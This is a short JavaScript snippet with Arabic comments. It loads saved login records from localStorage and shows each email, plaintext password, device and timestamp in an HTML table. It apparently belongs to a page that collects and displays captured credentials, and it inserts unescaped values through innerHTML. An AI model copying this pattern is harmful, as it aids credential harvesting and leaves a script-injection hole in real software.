function loadData() {
    // نحصل على بيانات الدخول من localStorage
    let logins = JSON.parse(localStorage.getItem("logins")) || [];
    const dataTable = document.getElementById("dataTable");
    
    if (logins.length === 0) {
      dataTable.innerHTML = "<tr><td colspan='4'>لا توجد بيانات دخول حالياً</td></tr>";
      return;
    }
  
    let rows = "";
    logins.forEach(login => {
      rows += `<tr>
                 <td>${login.email}</td>
                 <td>${login.password}</td>
                 <td>${login.device === "mobile" ? "📱 الهاتف" : "💻 الكمبيوتر"}</td>
                 <td>${login.timestamp}</td>
               </tr>`;
    });
    dataTable.innerHTML = rows;
  }
  
  function refreshData() {
    loadData();
  }
  
  // تحميل البيانات عند فتح الصفحة
  loadData();
  